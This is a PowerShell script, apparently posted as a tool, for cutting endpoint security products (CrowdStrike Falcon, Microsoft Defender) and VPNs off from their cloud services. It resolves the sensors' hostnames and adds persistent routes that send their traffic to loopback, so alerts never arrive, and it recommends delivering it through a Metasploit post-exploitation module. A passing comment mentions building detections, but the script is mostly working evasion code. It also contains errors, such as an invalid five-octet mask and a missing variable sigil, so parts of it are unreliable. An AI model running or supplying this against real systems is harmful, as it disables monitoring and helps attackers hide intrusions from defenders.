# This can be used to bypass Crowdstrike, Defender, And improperly configured VPNs w/o being detected.  Only downside is, you gotta be an admin!
# You'll need to add your own defender links to the target_URLs, IP Addressing blocks work suuuuper easily, and can neuter visibility such that a device reports active, but can't report timeline events or alerts.
# You'll also need to add your own addresses for other VPNs, but all-in-all it's really easy to work, and verified to work. 
# Test on your own network to build detections w/ whatever EDR toolsets you have.  Powershell vs. route methods work.
# Use with metasploit: modules/post/windows/manage/exec_powershell.rb


#CS IP Links https://www.dell.com/support/kbdoc/en-lv/000177899/crowdstrike-falcon-sensor-system-requirements
#CS IP Links https://github.com/simonsigre/crowdstrike_falcon-ipaddresses/blob/master/cs_falcon_commercial_cloud

$target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
$Regex_Lookups = @()#Fill this in with sites you want to block.
$IPs =@() #fill this with IPs you know you want to block.
$Iface_n = 'Fill This with the name of the interface you want to push your RFC1918 traffic to'


$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}
Get-DNSClientcache | foreach-object{$test = $_|out-string; foreach( $thing in $Regex_Lookups) {if ($test -like "*$thing*") {IPs += $_.data}}}



$IPs

$InterfaceAlias = "*Loopback*"
route /f
# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
$PanIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $Iface_n}).InterfaceIndex

route add -p 10.0.0.0 mask 255.0.0.0 0.0.0.0 if $PanIndex[0]
route add -p 172.16.0.0 mask 255.240.0.0 0.0.0.0 if $PanIndex[0]
route add -p 192.168.0.0 mask 255.255.0.0 0.0.0.0 if $PanIndex[0]
# These will just kill microsoft in general? I dunno, this is why you should read your code. 
#Microsoft defender for Endpoint IP ranges. (Source: Talos + Procmon)
route add -p 40.0.0.0 mask 255.0.0.0.0 0.0.0.0 if $InterfaceIndex[0]
route add -p 52.160.0.0 mask 255.224.0.0 0.0.0.0 if $InterfaceIndex[0]
route add -p 20.0.0.0 mask 255.0.0.0 0.0.0.0 if $InterfaceIndex[0]
route add -p 35.0.0.0 mask 255.0.0.0 0.0.0.0 if $InterfaceIndex[0]

$IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
}
            

#This is to check if you read the crap you run. But disable IPv6 if you want to kill Microsoft, it uses IPv6 as a fallback.
